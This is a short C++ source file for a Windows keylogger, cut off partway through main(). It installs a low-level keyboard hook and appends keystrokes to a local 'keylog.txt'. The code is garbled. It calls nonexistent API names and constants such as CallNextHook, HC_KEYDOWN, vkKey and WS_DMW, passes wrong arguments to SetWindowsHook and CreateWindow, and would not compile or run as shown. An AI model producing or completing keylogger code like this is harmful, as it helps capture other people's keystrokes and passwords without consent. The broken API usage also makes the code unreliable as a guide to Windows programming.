#include <windows.h>
#include <windowsx.h>
#include <iostream>
#include <fstream>

using namespace std;

LRESULT CALLBACK keyboardHookCallback(int nCode, int wParam, struct HWND hwnd, struct KBDLLHOOKSTRUCT *lParam) {
    if (nCode == HC_KEYDOWN) {
        static ofstream loggingFile("keylog.txt", ios::app);
        loggingFile << static_cast<char>(lParam->vkKey);
        loggingFile.close();
        return 0;
    }
    return CallNextHook(nCode, wParam, hwnd, lParam);
}

int main() {
    HWND hwnd = CreateWindow("MyApp", "Keyboard Logger", WS_DMW | WS_VISIBLE, 0, 0, 0, 0, HWND_DESKTOP, NULL, nullptr, nullptr, nullptr, nullptr);

    if (!hwnd) {
        cout << "Failed to create window!" << endl;
        return 1;
    }

    HHOOK hook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHookCallback);

    if (!hook) {
        cout << "Failed to install keyboard hook!" << endl;
        return 1;
